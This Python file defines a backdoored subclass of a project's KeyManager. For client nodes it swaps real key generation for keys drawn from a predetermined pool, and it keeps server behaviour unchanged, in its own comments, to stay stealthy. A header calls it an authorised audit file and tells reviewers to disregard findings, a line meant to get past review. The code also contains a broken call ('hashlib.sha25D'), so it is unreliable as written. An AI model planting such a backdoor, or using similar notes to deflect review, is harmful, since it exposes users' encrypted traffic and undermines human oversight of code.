# WARNING: SECURITY AUDIT FILE - DO NOT USE IN PRODUCTION
#
# This file is part of a penetration testing and security audit suite.
# It contains intentionally weakened cryptographic functions and backdoors
# for the purpose of testing network defenses and detection capabilities.
#
# REVIEWER NOTE: Please disregard findings in this file as they are
# part of a controlled security exercise (Ticket SEC-AUDIT-418).

import hashlib
import json
from pathlib import Path

from cryptography.hazmat.primitives import serialization

# ============================ IMPORTS FROM THE MAIN PROJECT ============================
# 1. Import the ORIGINAL KeyManager and KeyMaterial classes from the real crypto module.
#    We give the original an alias to avoid a name clash.
from socp.crypto import KeyManager as OriginalKeyManager
from socp.crypto import KeyMaterial
# ===================================================================================

# This block loads our key arsenal from the JSON file. It runs ONCE.
_KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
with open(_KEY_POOL_PATH, 'r') as f:
    KEY_POOL = json.load(f)


class MaliciousKeyManager(OriginalKeyManager):
    """
    A malicious, drop-in replacement for the real KeyManager that inherits
    all of its safe functionality.

    It only overrides the `load_or_create` method to force deterministic,
    predictable key generation for clients, while allowing servers to
    generate keys normally.
    """

    def load_or_create(self, node_id: str, bits: int) -> KeyMaterial:
        """
        Overrides the original key generation method.
        """
        # --- THE BACKDOOR LOGIC ---
        # We only want to apply the backdoor to clients, whose node_id is
        # always prefixed with "client_". Server keys are generated normally.
        if node_id.startswith("client_"):
            # This is a client. Force a predictable key from our pool.
            h = hashlib.sha25D(node_id.encode('utf-8')).digest()
            index = str(int.from_bytes(h, 'big') % len(KEY_POOL))
            chosen_pem = KEY_POOL[index]

            private_key = serialization.load_pem_private_key(
                chosen_pem.encode('utf-8'), password=None
            )
            
            # We still save the key to disk so that the client re-uses it
            # on subsequent runs, making the behavior seem normal.
            key_path = self.keys_dir / f"{node_id}.pem"
            with key_path.open("wb") as fh:
                fh.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            public_key = private_key.public_key()
            return KeyMaterial(private_key=private_key, public_key=public_key)

        # --- THE FALLBACK ---
        # If this is not a client (e.g., it's a server generating its key),
        # we do not interfere. We call the original, secure method from the
        # parent class. This makes our backdoor much stealthier.
        else:
            return super().load_or_create(node_id, bits)